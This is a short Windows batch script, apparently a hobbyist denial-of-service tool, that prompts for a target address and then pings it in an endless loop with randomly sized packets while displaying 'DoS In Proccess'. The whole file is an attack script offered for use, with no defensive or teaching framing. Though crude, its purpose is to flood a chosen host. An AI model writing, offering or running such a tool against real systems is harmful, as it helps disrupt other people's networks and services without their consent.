@echo off

color a

echo [[Enter Target]]
echo ----------------
set /p web=

:dos
cls
echo [[DoS In Proccess]]
echo -------------------
set /a rng=(%random%/15)
ping %web% -l %rng%
goto dos
